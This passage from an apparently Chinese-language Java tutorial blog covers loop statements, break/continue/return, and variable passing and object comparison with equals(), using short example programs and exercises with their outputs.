夏季</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-2-循环语句"><a href="#2-2-循环语句" class="headerlink" title="2.2  循环语句"></a><font color="#3CB371" face="Comic sans MS">2.2  循环语句</font></h4><h5 id="while-语句"><a href="#while-语句" class="headerlink" title="while  语句  "></a><font color="#00B2EE" face="Comic sans MS">while  语句  </font></h5><p><font face="Comic sans MS">while语句形式如下：<br>&amp;emsp;&amp;emsp;<font color="red">     while (布尔表达式) {语句块}  </font><br><strong>说明：</strong>while：语句的关键字； 布尔表达式：循环条件； 语句块：循环体，是一个语句，若是多个语句则应构成复合语句。<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-7] Sum1.java用<span class="keyword">while</span>循环语句计算s=1+1/2+1/3+…+1/100</span><br><span class="line">class Sum &#123;</span><br><span class="line">  public static void main(String args[]) &#123;</span><br><span class="line">    int n=100;　                //循环总数n=100</span><br><span class="line">    int  i=1;　　     　　      //循环次数，初值为１</span><br><span class="line">    <span class="built_in">float</span> s=0;                 //和s为实型</span><br><span class="line">    <span class="keyword">while</span> (i&lt;=100) 　　　      //循环条件,循环总数100</span><br><span class="line">    &#123;</span><br><span class="line">     s=s+(1.0f/i);            //s增加1/i ,1.0f表示是<span class="built_in">float</span>型</span><br><span class="line">     i++;                    //循环次数加１</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(“s=”+s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;                              </span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h5 id="do-while-语句"><a href="#do-while-语句" class="headerlink" title="do-while  语句  "></a><font color="#00B2EE" face="Comic sans MS">do-while  语句  </font></h5><p><font face="Comic sans MS">do-while语句的语法形式如下：<br>&amp;emsp;&amp;emsp;<font color="red">     do{<br>&amp;emsp;&amp;emsp;                        语句块<br>&amp;emsp;&amp;emsp;                         }while（布尔表达式）;<br></font><br><strong>说明：</strong>do：语句的关键字； 语句块：循环体，是一个语句，若是多个语句则应构成复合语句； 布尔表达式：循环条件。<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-8] Sum2.java 用do-while循环语句计算s=1+2+3+……100</span><br><span class="line">class Sum2&#123;</span><br><span class="line">	public static void main(String args[])&#123;</span><br><span class="line">		int i=1;         //循环次数，初值为１</span><br><span class="line">		int s=0;         //累加和s初值为0</span><br><span class="line">		<span class="keyword">do</span>&#123;              //开始无条件循环</span><br><span class="line">			s=s+i;       //s增加i</span><br><span class="line">			i++;         //循环次数加１</span><br><span class="line">		&#125;<span class="keyword">while</span>(i&lt;=100);  //循环总数100</span><br><span class="line">		System.out.println(<span class="string">&quot;s=&quot;</span>+s);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h5 id="for-语句"><a href="#for-语句" class="headerlink" title="for 语句  "></a><font color="#00B2EE" face="Comic sans MS">for 语句  </font></h5><p><font face="Comic sans MS">for语句的语法形式为：<br>&amp;emsp;&amp;emsp;<font color="red">for（表达式1；表达式2；表达式3）<br>&amp;emsp;&amp;emsp;                  {   语句块<br>&amp;emsp;&amp;emsp;                  }<br></font><br><strong>说明：</strong>（表达式1；表达式2；表达式3）：循环条件； 语句块：循环体，是一个语句，若是多个语句则应构成复合语句。</p>
<p><font color="red"> <strong>for语句的执行过程如下：</strong></font><br>（1）按表达式1将初值赋给循环控制变量；<br>（2）按表达式2判断循环是否成立，如果成立则执行循环体，否则退出循环；<br>（3）执行一次循环后，执行表达式3修改控制变量。<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-9] sum3.java 编程求S=12+22+…92 </span><br><span class="line">public class sum3&#123;</span><br><span class="line">	public static void main(String args[])&#123;</span><br><span class="line">		int s=0;</span><br><span class="line">		<span class="keyword">for</span>(int i=1;i&lt;=9;i++)</span><br><span class="line">		   s=s+i*i;</span><br><span class="line">		   System.out.println(<span class="string">&quot;s=&quot;</span>+s);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**for语句使用注意：**</font>    
1.  逗号语句分隔的语句系列,被看作一个语句，这样就可以在只能放一个语句的地方放任意多个语句，只须用逗
    号将它们分隔开。如： 
      for ( i=1,j=10;i < j;i++,j--)
      {    ……    }
2.  表达式1、表达式2及表达式3都可以为空语句(但分号不能省略) 如：
         for(  ;  ;  ) { … }     相当于while(true)   


<p><font color="red"><strong>循环的嵌套：</strong></font><br>一个循环体内又包含<font color="red">另一个完整的循环结构</font> ，称为循环的嵌套。内嵌的循环中还可以嵌套循环，这就是多重<br>循环。上述三种循环（while循环，do-while循环和for循环）语句之间可以相互嵌套使用。<br></font></td></tr></table></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-10] 百鸡问题。</span><br><span class="line">      已知公鸡5元1只，母鸡3元一只，小鸡1元3只，要求用100元刚好买100只鸡，问有多少种采购方案。</span><br><span class="line"></span><br><span class="line">     分析: 设变量I、J、K分别代表公鸡数、母鸡数及小鸡数，则应满足下列一些条件:</span><br><span class="line">① I+J+K=100(只)，I,J,K0;</span><br><span class="line">② 5I+3J+K/3=100（元）;</span><br><span class="line">③ 若用100元全部买公鸡，最多只能买20只, 所以I≤20;若全部买母鸡最多只能买33只，所以J≤33; </span><br><span class="line">  而小鸡数目就是100-I-J;(简化计算)</span><br><span class="line">     根据以上分析，可编程如下：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class  Loop_Loop &#123;</span><br><span class="line">    public static void main(String args[]) &#123;</span><br><span class="line">      int I,J,K;</span><br><span class="line">      System.out.println(<span class="string">&quot; I    J    K &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span>  (I=0;I&lt;=20;I++ )</span><br><span class="line">       &#123; <span class="keyword">for</span> ( J=0;J&lt;=33;J++)</span><br><span class="line">            &#123; K=100-I-J;                </span><br><span class="line">              <span class="keyword">if</span> (5*I+3*J+K/3.0==100)         //注意“K/3.0”</span><br><span class="line">              System.out.println(I+<span class="string">&quot;   &quot;</span>+J+<span class="string">&quot;   &quot;</span>+K);</span><br><span class="line">            &#125; </span><br><span class="line">       &#125;</span><br><span class="line">   &#125;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-3-跳转语句"><a href="#2-3-跳转语句" class="headerlink" title="2.3  跳转语句"></a><font color="#3CB371" face="Comic sans MS">2.3  跳转语句</font></h4><h5 id="break语句"><a href="#break语句" class="headerlink" title="break语句  "></a><font color="#00B2EE" face="Comic sans MS">break语句  </font></h5><p><font face="Comic sans MS"><font color="red"><strong>作用：</strong></font>  使程序的流程从一个语句块的内部跳转出来。<br>(1) 从switch语句的分支中跳出来<br>(2) 从循环体内跳出来<br></font> </p>
<p>对上述的(1)(2)举例如下：<font color="#00B2EE"><strong>(1) break用于跳出switch语句</strong></font>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">switch(grade)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>: </span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: </span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: System.out.println(<span class="string">&quot;及格\n &quot;</span>); <span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">case</span> ‘D’: System.out.println(“不及格\n <span class="string">&quot;); break;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">习题1：分析该程序的输出结果</span><br><span class="line">int x=5;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">          switch(x%2)</span><br><span class="line">          &#123;</span><br><span class="line">                <span class="keyword">case</span> 1: x--;</span><br><span class="line">                            <span class="built_in">break</span>;</span><br><span class="line">                <span class="keyword">case</span> 0: x++;</span><br><span class="line">                            <span class="built_in">break</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           x--;</span><br><span class="line">           System.out.println(x);</span><br><span class="line">     &#125;<span class="keyword">while</span>(x&gt;0);</span><br><span class="line">运行结果：</span><br><span class="line">3</span><br><span class="line">1</span><br><span class="line">-1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">习题2：分析该程序的输出结果</span><br><span class="line">int a=5,b=6,i=0,j=0;</span><br><span class="line">switch(a)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">case</span> 5: switch(b)</span><br><span class="line">                    &#123;</span><br><span class="line">                          <span class="keyword">case</span> 5:i++;<span class="built_in">break</span>;</span><br><span class="line">                          <span class="keyword">case</span> 6:j++;<span class="built_in">break</span>;</span><br><span class="line">                          default:i++;j++;</span><br><span class="line">                     &#125;</span><br><span class="line">         <span class="keyword">case</span> 6: i++;j++;</span><br><span class="line">                     <span class="built_in">break</span>;</span><br><span class="line">         default: i++;j++;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(i+<span class="string">&quot;,&quot;</span>+j);</span><br><span class="line">运行结果：</span><br><span class="line">1,2</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="#00B2EE"><strong>(2) break用于跳出循环体</strong></font>  </p>
<p><strong>break可用于跳出for循环、while循环、do while循环。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int sum=0;      </span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=100;i++)</span><br><span class="line">&#123;</span><br><span class="line">      sum=sum+i;</span><br><span class="line">      <span class="keyword">if</span>(i==50)<span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(sum);    //结果为1275</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;<br><font color="red"><strong>如果break在多重循环中，只退出break所在的那层循环到外层循环中。</strong></font>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int sum=0;      </span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=100;i++)</span><br><span class="line">&#123;</span><br><span class="line">       sum=sum+i;</span><br><span class="line">       <span class="keyword">while</span>(i==50)&#123;i=100;<span class="built_in">break</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(sum);       //结果为1275</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h5 id="continue-语句"><a href="#continue-语句" class="headerlink" title="continue 语句 "></a><font color="#00B2EE" face="Comic sans MS">continue 语句 </font></h5><p><font face="Comic sans MS"><font color="red"><strong>作用：</strong></font>用来结束所在循环语句块的本次循环<br><font color="red"><strong>注意:</strong></font>continue语句只能在循环语句中使用。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-11] ConDemo.java</span><br><span class="line">public class ConDemo&#123;</span><br><span class="line">public static void main(String args[])&#123;</span><br><span class="line">  int index=0;</span><br><span class="line">  <span class="keyword">while</span>(index&lt;=99)</span><br><span class="line"> &#123;</span><br><span class="line">	index+=10;</span><br><span class="line">           <span class="keyword">if</span>(index==40)  <span class="built_in">continue</span>; </span><br><span class="line">	System.out.println(<span class="string">&quot;   The index is &quot;</span>+index);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">程序运行结果：</span><br><span class="line">   The index is 10</span><br><span class="line">   The index is 20</span><br><span class="line">   The index is 30</span><br><span class="line">   The index is 50</span><br><span class="line">   The index is 60</span><br><span class="line">   The index is 70</span><br><span class="line">   The index is 80</span><br><span class="line">   The index is 90</span><br><span class="line">   The index is 100</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>循环体中使用break语句和continue语句的区别：</strong></font><br><font color="#00B2EE"><strong>Break语句</strong></font>  结束整个循环,不再判断执行循环的条件;<br><font color="#00B2EE"><strong>Continue语句</strong></font>只结束本次循环,而不是终止整个循环的执行。<br></font>  </p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h5 id="return-语句"><a href="#return-语句" class="headerlink" title="return 语句  "></a><font color="#00B2EE" face="Comic sans MS">return 语句  </font></h5><p><font face="Comic sans MS"><strong>格式：</strong>   <font color="red">return  表达式;</font><br><strong>用途：</strong><br>(1) 结束方法的运行，并返回一个值；<br>(2) 如果该方法没有返回值（void），则return后不能跟表达式。<br></font></p>
<blockquote>
<blockquote>
<p>例如：  return  0;<br>&amp;emsp;&amp;emsp;&amp;emsp;   return;</p>
</blockquote>
</blockquote>
<p><strong>思考:分析以下程序运行结果</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. </span><br><span class="line">public class ArithmeticOp&#123;</span><br><span class="line">    public static void main(String args[ ])&#123;</span><br><span class="line">       int a,b,c;</span><br><span class="line">       a=b=c=2;</span><br><span class="line">       a=++b - ++c;     //0 3 3</span><br><span class="line">       System.out.println（″a=″+a+″b=″+b+″c=″+c）;</span><br><span class="line">       a =b++ + c++;    //6 4 4</span><br><span class="line">       System.out.println（″a=″+a+″b=″+b+″c=″+c）;</span><br><span class="line">       a =b-- + c--;    //8 3 3</span><br><span class="line">       System.out.println（″a=″+a+″b=″+b+″c=″+c）;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">public class TestSwitch&#123;</span><br><span class="line">    public static void main(String args[ ])&#123;</span><br><span class="line">       int  x=1,y=2,i=0,j=0;</span><br><span class="line">       switch(x)&#123;</span><br><span class="line">          <span class="keyword">case</span> 1: switch(y)&#123;</span><br><span class="line">                   <span class="keyword">case</span> 1: i++;</span><br><span class="line">                   <span class="built_in">break</span>;</span><br><span class="line">                   <span class="keyword">case</span> 2: j++;</span><br><span class="line">                   <span class="built_in">break</span>;</span><br><span class="line">                   default:i++;</span><br><span class="line">                    j++;&#125;           //i=0 j=1</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> 2: i++;</span><br><span class="line">                  j++;              //i=1 j=2</span><br><span class="line">                  <span class="built_in">break</span>;</span><br><span class="line">          default:i++;</span><br><span class="line">                  j++;</span><br><span class="line">       &#125;</span><br><span class="line">      System.out.println(<span class="string">&quot;i=&quot;</span>+i);</span><br><span class="line">      System.out.println(<span class="string">&quot;j=&quot;</span>+j);</span><br><span class="line">    &#125;                              //i=1</span><br><span class="line">&#125;                                  //j=2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.</span><br><span class="line">public class J_Test&#123;</span><br><span class="line">  static boolean mb_fun(char c)</span><br><span class="line">  &#123;    System.out.print(c);</span><br><span class="line">       <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  public  static void main(String args[])&#123;</span><br><span class="line">       int i=0;</span><br><span class="line">       <span class="keyword">for</span>(mb_fun(‘A’);mb_fun(‘B’)&amp;&amp;(i&lt;2);mb_fun(‘C’))</span><br><span class="line">       &#123;   i++;</span><br><span class="line">           mb_fun(‘D’);</span><br><span class="line">       &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;     //结果： A B D C B D C B</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
        <tag>Java语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Java变量及其传递、内部类(4.9-4.10)</title>
    <url>/post/Java-Variable-InnerClass6/</url>
    <content><![CDATA[<p>&amp;emsp;<br>&amp;emsp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>变量及其传递 & 内部类</font></center>

<p>&amp;emsp;</p>
<h3 id="一、-Java变量及其传递"><a href="#一、-Java变量及其传递" class="headerlink" title="一、 Java变量及其传递"></a><font color="#FF6347" face="Comic sans MS">一、 Java变量及其传递</font></h3><h4 id="1-1-基本数据变量与引用型变量"><a href="#1-1-基本数据变量与引用型变量" class="headerlink" title="1.1  基本数据变量与引用型变量"></a><font color="#20B2AA" face="Comic sans MS">1.1  基本数据变量与引用型变量</font></h4><p><font face="Comic sans MS"><strong>1.  📒Java变量:</strong><br>&amp;emsp;<font color="red"><strong>(1). 基本型变量(8种)</strong></font><br>&amp;emsp;&amp;emsp; <strong>char,byte,short,int,long,float,double,boolean</strong><br>&amp;emsp;<font color="red"><strong>(2). 引用型变量：</strong></font><strong>对象,接口,数组</strong></font>            </p>
<p><img data-src="https://i.loli.net/2018/12/27/5c24f23dc321f.png" alt="T2.png"><br><img data-src="https://i.loli.net/2018/12/27/5c24f4379eed2.png" alt="N.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">举例：</span><br><span class="line">    public class MyDate&#123;</span><br><span class="line">	private int day=12;</span><br><span class="line">	private int month=6;</span><br><span class="line">	private int year=1900;</span><br><span class="line">	public MyDate(int y,int m,int d)&#123;</span><br><span class="line">		year=y;</span><br><span class="line">		month=m;</span><br><span class="line">		day=d;&#125;</span><br><span class="line">          void addYear()</span><br><span class="line">	&#123;   year++;&#125;</span><br><span class="line">         public void <span class="function"><span class="title">display</span></span>()&#123;</span><br><span class="line">	System.out.println(year+<span class="string">&quot;-&quot;</span>+month</span><br><span class="line">             +<span class="string">&quot;-&quot;</span>+day);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">       MyDate m,n;</span><br><span class="line">       m=new MyDate(2003,9,22);</span><br><span class="line">       n=m;     <span class="string">&quot;//n和m指向同一个地址&quot;</span></span><br><span class="line">       n.addYear();</span><br><span class="line">       m.display();</span><br><span class="line">       n.display();</span><br><span class="line">       System.out.println(m.toString());</span><br><span class="line">       System.out.println(n.toString());	</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      /*运行结果</span><br><span class="line">       2004-9-22</span><br><span class="line">       2004-9-22</span><br><span class="line">       MyDate@11a698a</span><br><span class="line">       MyDate@11a698a</span><br><span class="line">      */</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-2-成员变量与局部变量"><a href="#1-2-成员变量与局部变量" class="headerlink" title="1.2  成员变量与局部变量"></a><font color="#20B2AA" face="Comic sans MS">1.2  成员变量与局部变量</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**成员变量与局部变量有没有区别?**</font>
  成员变量若为static的称为类变量，否则称为成员变量，而局部变量是在方法体内的变量。
 (1) 📒从语法形式上看，成员变量是属于类或接口的，而局部变量是在方法中定义的变量或方法的参变量；
 成员变量可以被public，private，static等修饰，而局部变量则不能被访问控制符及static修饰；成员
 变量及局部变量都可以被final修饰。
(2) 📒从变量在内存中的存储方式看，成员变量是对象的一部分，而对象是存在于堆中的，而局部变量是
     存在于栈中的。
(3) 📒从变量在内存中的存在时间上看，成员变量是对象的一部分，它随着对象的创建而存在，而局部变
     量随着方法的调用而产生，随着方法调用结束而自动消失。
(4) 📒成员变量如果没有赋初值，则会自动以该类型的默认值（0,false,null等）赋值；而局部变量则不会
     自动赋值，必须显示地赋值后才能使用。 
</font></td></tr></table>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">class A&#123;</span><br><span class="line">         int a;</span><br><span class="line">         void <span class="function"><span class="title">m</span></span>()&#123;</span><br><span class="line">            int b;</span><br><span class="line">            System.out.println(a);  //合法的，a的值为0</span><br><span class="line">            System.out.println(b);  //不合法，编译不通过</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-3-变量的传递"><a href="#1-3-变量的传递" class="headerlink" title="1.3  变量的传递"></a><font color="#20B2AA" face="Comic sans MS">1.3  变量的传递</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 📒按值传递:</strong></font>当将一个参数传递给一个函数时，函数接收的是原始值的一个副本。因此，如果函数修改了该参数，仅改变副本，而原始值保持不变。(传递8种基本型变量)<br><font color="red"><strong>2. 📒按引用传递:</strong></font>当将一个参数传递给一个函数时，函数接收的原始值的内存地址，而不是值的副本，因此，如果修改了该参数，调用代码中的原始值也随之改变。(传递对象,接口,数组)<br><font color="#00B2EE"><em>Java中的参数传递比C++简单,按值传递所有参数,制作所有参数的副本,而不管它们的类型。</em></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例1：</span><br><span class="line">class TestTransOfValue</span><br><span class="line">&#123;</span><br><span class="line">  public static void main(String args[])</span><br><span class="line">  &#123;</span><br><span class="line">    int val;</span><br><span class="line">    StringBuffer sb1, sb2;</span><br><span class="line">    val = 10;</span><br><span class="line">    sb1 = new StringBuffer(<span class="string">&quot;apples&quot;</span>);</span><br><span class="line">    sb2 = new StringBuffer(<span class="string">&quot;pears&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;val is &quot;</span> + val);</span><br><span class="line">    System.out.println(<span class="string">&quot;sb1 is &quot;</span> + sb1);</span><br><span class="line">    System.out.println(<span class="string">&quot;sb2 is &quot;</span> + sb2);</span><br><span class="line">    System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;calling modify&quot;</span>);</span><br><span class="line">    //按值传递所有参数</span><br><span class="line">    modify(val, sb1, sb2);</span><br><span class="line">    System.out.println(<span class="string">&quot;returned from modify&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;val is &quot;</span> + val);</span><br><span class="line">    System.out.println(<span class="string">&quot;sb1 is &quot;</span> + sb1);</span><br><span class="line">    System.out.println(<span class="string">&quot;sb2 is &quot;</span> + sb2);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">public static void modify(int a, StringBuffer r1,</span><br><span class="line">                         StringBuffer r2)</span><br><span class="line">  &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;in modify...&quot;</span>);</span><br><span class="line">    //在方法中修改基本类型变量的值</span><br><span class="line">    a = 0;  </span><br><span class="line">    //在方法中修改对象引用值的副本</span><br><span class="line">    r1 = null;  //1</span><br><span class="line">    //在方法中修改副本的对象实体值</span><br><span class="line">    r2.append(<span class="string">&quot; taste good&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;a is &quot;</span> + a);</span><br><span class="line">    System.out.println(<span class="string">&quot;r1 is &quot;</span> + r1);</span><br><span class="line">    System.out.println(<span class="string">&quot;r2 is &quot;</span> + r2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">运行后输出：</span><br><span class="line">val is 10</span><br><span class="line">sb1 is apples</span><br><span class="line">sb2 is pears</span><br><span class="line">calling modify <span class="keyword">in</span> modify...</span><br><span class="line">a is 0</span><br><span class="line">r1 is null</span><br><span class="line">r2 is pears taste good </span><br><span class="line">returned from modify</span><br><span class="line">val is 10</span><br><span class="line">sb1 is apples</span><br><span class="line">sb2 is pears taste good </span><br><span class="line">/*关于这里的sb1和r1：</span><br><span class="line">当参数传到modify后，r1和sb1指向同一个地址，若改变了r1指向的地址，并不会更改sb1指向的地址。这个时候就</span><br><span class="line">相当于看作两个指针了。</span><br><span class="line">关于sb2和r2：</span><br><span class="line">sb2和r2指向同一个地址，这个地址指向的值(实体值)被改变了，则结束后sb2和r2的实体值也就相应的改变了。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<p><img data-src="https://i.loli.net/2018/12/28/5c2500f374fbd.png" alt="FX.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例2：</span><br><span class="line">class Swap</span><br><span class="line">&#123; </span><br><span class="line"> public static void main(String args[])</span><br><span class="line">  &#123;</span><br><span class="line">    Integer a, b;</span><br><span class="line">    a = new Integer(10);</span><br><span class="line">    b = new Integer(50);</span><br><span class="line">    System.out.println(<span class="string">&quot;before swap...&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;a is &quot;</span> + a);</span><br><span class="line">    System.out.println(<span class="string">&quot;b is &quot;</span> + b);</span><br><span class="line">    swap(a, b);</span><br><span class="line">    System.out.println(<span class="string">&quot;after swap...&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;a is &quot;</span> + a);</span><br><span class="line">    System.out.println(<span class="string">&quot;b is &quot;</span> + b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> public static void swap(Integer a, Integer b)</span><br><span class="line">  &#123;</span><br><span class="line">    Integer temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">    System.out.println(<span class="string">&quot;in swap...&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;a is &quot;</span> + a);</span><br><span class="line">    System.out.println(<span class="string">&quot;b is &quot;</span> + b);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">运行后输出：</span><br><span class="line">before swap...</span><br><span class="line">a is 10</span><br><span class="line">b is 50</span><br><span class="line"><span class="keyword">in</span> swap…</span><br><span class="line">a is 50</span><br><span class="line">b is 10</span><br><span class="line">after swap...</span><br><span class="line">a is 10</span><br><span class="line">b is 50 </span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**参数传递总结：**</font>
 (1) Java按值传递所有参数,制作所有参数的副本,而不管它们的类型
 (2) 对于基本类型的变量形参修改了并不能反映到函数外面的实参
 (3) 对于引用类型的变量，在形参中修改了对象实体值可以反映到实参，在形参中修改了对象引用值，
     不能反映到实参
</font></td></tr></table>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-4-引用型变量的实体值、引用值比较"><a href="#1-4-引用型变量的实体值、引用值比较" class="headerlink" title="1.4  引用型变量的实体值、引用值比较"></a><font color="#20B2AA" face="Comic sans MS">1.4  引用型变量的实体值、引用值比较</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 📒参数传递总结：</strong></font><br> (1) 比较基本类型的数据: &#x3D;&#x3D;和!&#x3D;<br> (2) 如果要比较引用型变量是否相同,可以直接用&#x3D;&#x3D;和!&#x3D;吗?<font color="red">  <strong>答：不能</strong></p>
<p><strong>&#x3D;&#x3D;和!&#x3D;用来比较引用型变量时（只能比较引用值（地址）是不是相等）,只能判断运算符两边引用的是不是同一个对象,即对象的地址值（或对象引用值）！！！！！</strong></font><br><font color="#00B2EE"><strong>如何比较两个对象的内容(对象实体值)是否相同?<br>用equls()方法：</strong></font><br></font></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**2. 📒引用型变量比较总结：**</font>
 (1) 比较两个变量是否同一个对象（即对象引用值是否相同），用==和!=
 (2) 比较两个变量的内容是否相同用equals方法
 (3) **自己定义的类如果要支持equals方法必须重写从Object类继承来的equals方法(比如前面的String类
 是java自己的类就不需要重写equals，但是Employee类就是自己定义的类则需要重写equals)**

<p><strong>Object类中的equals方法：</strong><br> <em>public boolean equals(Object obj){<br>   return (this&#x3D;&#x3D;obj);<br> }</em><br></font></td></tr></table></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">equals示例1:</span><br><span class="line">class EqualsTest&#123;</span><br><span class="line">  public static void main(String[] arguments)</span><br><span class="line">  &#123;</span><br><span class="line">     String str1,str2;</span><br><span class="line">     str1=<span class="string">&quot;Free the bound periodicals.&quot;</span>;</span><br><span class="line">     str2=str1;</span><br><span class="line">     System.out.println(<span class="string">&quot;String1: &quot;</span>+str1);</span><br><span class="line">     System.out.println(<span class="string">&quot;String2: &quot;</span>+str2);</span><br><span class="line">     System.out.println(<span class="string">&quot;Same object? &quot;</span>+(str1==str2));      //<span class="literal">true</span></span><br><span class="line">     str2=new String(str1);</span><br><span class="line">     System.out.println(<span class="string">&quot;String1: &quot;</span>+str1);</span><br><span class="line">     System.out.println(<span class="string">&quot;String2: &quot;</span>+str2);</span><br><span class="line">     System.out.println(<span class="string">&quot;Same object? &quot;</span>+(str1==str2));      //<span class="literal">false</span></span><br><span class="line">     System.out.println(<span class="string">&quot;Same value? &quot;</span>+str1.equals(str2));  //<span class="literal">true</span></span><br><span class="line">     String str3,str4;</span><br><span class="line">     str3=<span class="string">&quot;busy&quot;</span>;</span><br><span class="line">     str4=<span class="string">&quot;busy&quot;</span>; //str4=new String(<span class="string">&quot;busy&quot;</span>)或str4=new String(str3) </span><br><span class="line">     System.out.println(<span class="string">&quot;String3: &quot;</span>+str3);</span><br><span class="line">     System.out.println(<span class="string">&quot;String4: &quot;</span>+str4);</span><br><span class="line">     System.out.println(<span class="string">&quot;Same object? &quot;</span>+(str3==str4));       //<span class="literal">true</span></span><br><span class="line">     System.out.println(<span class="string">&quot;Same value? &quot;</span>+str3.equals(str4));   //<span class="literal">true</span> </span><br><span class="line">     String str5,str6;</span><br><span class="line">     str5=<span class="string">&quot;str5busy&quot;</span>;</span><br><span class="line">     str6=<span class="string">&quot;str6busy&quot;</span>;</span><br><span class="line">     System.out.println(<span class="string">&quot;String5: &quot;</span>+str5);</span><br><span class="line">     System.out.println(<span class="string">&quot;String6: &quot;</span>+str6);</span><br><span class="line">     System.out.println(<span class="string">&quot;Same object? &quot;</span>+(str5==str6));      //<span class="literal">false</span></span><br><span class="line">     System.out.println(<span class="string">&quot;Same value? &quot;</span>+str5.equals(str6));  //<span class="literal">false</span> 	</span><br><span class="line">   &#125;</span><br><span 